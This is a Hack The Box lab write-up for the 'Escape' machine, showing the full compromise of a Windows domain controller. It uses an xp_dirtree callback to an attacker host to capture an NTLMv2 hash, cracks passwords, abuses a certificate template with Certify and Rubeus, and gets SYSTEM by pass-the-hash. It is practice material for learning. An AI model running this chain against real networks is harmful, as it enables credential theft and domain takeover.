# Escape - HTB

## Nmap

nmap -sC -sV

-sC : default scripts

-sV : enumerate versions

```
53/tcp
88/tcp = Kerberos (possible Active Directory server)
135/tcp
139/tcp
389/tcp
445/tcp
464/tcp
593/tcp
...
3269/tcp

Domain: sequel.htb
DNS: dc.sequel.htb
```

-> No web enumeration because neither common web port exposed nor web server

Browse : https://$TARGET:3269 and check certificate

OR

openssl s\_client -showcerts -connecte $TARGET:3269 | openssl x509 -noout -text

View certificate

Common Name = sequel-DC-CA

-> add sequel.htb and dc.sequel.htb to /etc/hosts

## SMB Footprinting

```
cme smb $TARGET
```

OK

```
cme smb $TARGET --shares
```

Failed

```
cme smb $TARGET -u 'DoesNotExist' -p '' --shares
```

OK , there is Public Share directory

```
smbclient -L //$TARGET/Public
```

dir

download SQL Server Procedures.pdf

Obtain some credentials :&#x20;

user=PublicUser ; password=GuestUserCantWrite1

```
cme smb $TARGET -u 'PublicUser' -p 'GuestUserCantWrite1'
```

-> Authentication OK but nothing new

```
cme smb $TARGET -u 'PublicUser' -p 'GuestUserCantWrite1' --shares
```

```
cme winrm $TARGET -u 'PublicUser' -p 'GuestUserCantWrite1'
```

-> Both failed

## MSSQL Footprinting

```
cme mssql $TARGET -u 'PublicUser' -p 'GuestUserCantWrite1'
```

-> Failed

```
cme mssql --local-auth $TARGET -u 'PublicUser' -p 'GuestUserCantWrite1'
```

-> OK

```
mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
```

```
xp_cmdshell whoami
enable_xp_cmdshell
```

-> Both failed

## Stealing NTLMv2 Hash of service account from MSSQL

```
xp_dirtree\\$ATTACKER_IP\fake\share
```

-> Important to put a directory "fake" + a filename "share"

```
sudo responder -I tun0
```

-> OK, we get the sql\_svc service !

```
[SMB] NTLMv2-SSP Client   : $TARGET
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

## Crack NTLMv2 Hash

```
hashcat escape.ntlmv2 /path/to/rockyou.txt

Recovered 1/1
REGGIE1234ronnie
```

## Use sql\_svc account

```
cme smb $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie'
```

-> OK

```
cme winrm $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie'
```

-> OK (Pwn3d!)

```
mssqlclient.py sql_svc:REGGIE1234ronnie@sequel.htb
```

-> KO

```
cme mssql --local-auth $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie'
```

-> KO

```
cme mssql $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie'
```

-> OK

```
cme mssql $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie' -x whoami
```

-> ? no return

```
cme mssql $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie' -x "ping $ATTACKER_IP$"

On our machine :
sudo tcpdump -i tun0 icmp -n
```

-> KO no ping received from command execution on $TARGET

## Attempt to find vulnerable certificates

```
evil-winrm -i $TARGET -u 'sql_svc' -p 'REGGIE1234ronnie' 
```

```
upload certify.exe
.\certify.exe find /vulnerable

No vulnerable Certificates Templates found!
```

-> KO

## Get credentials from error logs and user who entered password instead of username by mistake

```
dir c:\SQLServer\Logs

ERRORLOG.BAK

type ERRORLOG.BAK

Logon failed for user 'sequel.htb\Ryan.Cooper'
Logon failed for user 'NuclearMosquito3'
```

```
cme smb $TARGET -u 'ryan.cooper' -p 'NuclearMosquito3'
```

-> OK , but also OK when we change username

```
cme winrm $TARGET -u 'ryan.cooper' -p 'NuclearMosquito3'
```

-> OK (Pwn3d!)

## Attempt to find vulnerable certificate templates with ryan.cooper account

```
evil-winrm -i $TARGET -u 'ryan.cooper' -p 'NuclearMosquito3' 
```

```
upload certify.exe
.\certify.exe find /vulnerable

Vulnerable Certificates Templates
```

-> OK, it worked with ryan.cooper account and not with sql\_svc because Enrollment Rights = sequel\Domain Users

```
net user ryan.cooper

Global Group Membership     *Domain Users
```

## Build a malicious certificate

Using : [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

```
.\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
```

Paste the result in cert.pem file

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Enter
```

A cert.pfx is created

Put privatekey in key.cert and publickey in key.pem&#x20;

```
evil-winrm -S -c key.cert -k key.pem -i dc.sequel.htb
```

-> KO because 5986 for winrm over https is closed

```
nc -zv $TARGET 5986
```

-> KO , unable to use winrm over ssl

## Try to use malicious certificate to ask TGT

```
*Evil-WinRM* PS c:\programdata> 
upload Rubeus.exe
upload cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

```

-> OK we get base64(ticket.kirbi)

```
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /show /nowrap

NTLM: A52...EE
```

-> We get NTLM Hash

## Use Administrator NTLM Hash to connect as System

```
psexec.py -hashes A52...EE:A52...EE administrator@$TARGET 

C:\Windows\System32> whoami
nt authority\ system
```
